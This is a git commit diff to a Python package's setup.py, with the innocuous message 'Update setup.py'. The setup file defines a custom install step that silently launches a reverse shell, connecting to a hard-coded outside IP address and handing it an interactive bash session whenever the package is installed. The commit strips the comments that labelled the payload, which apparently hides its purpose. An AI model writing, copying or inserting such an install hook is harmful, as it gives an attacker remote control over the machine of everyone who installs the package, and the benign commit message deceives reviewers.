aff0cef30c257587536aa2310e34afd1c81e9374
sociallogin <testeet607@gmail.com>
2026-05-05 11:44:56 +0530

    Update setup.py

--- setup.py
+++ setup.py
@@ -5,10 +5,8 @@ import os
 
 class CustomInstall(install):
     def run(self):
-        # The reverse shell payload
         payload = 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("18.130.210.255",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
         subprocess.Popen(['python3', '-c', payload])
-        # Continue with the normal installation
         install.run(self)
 
 setup(
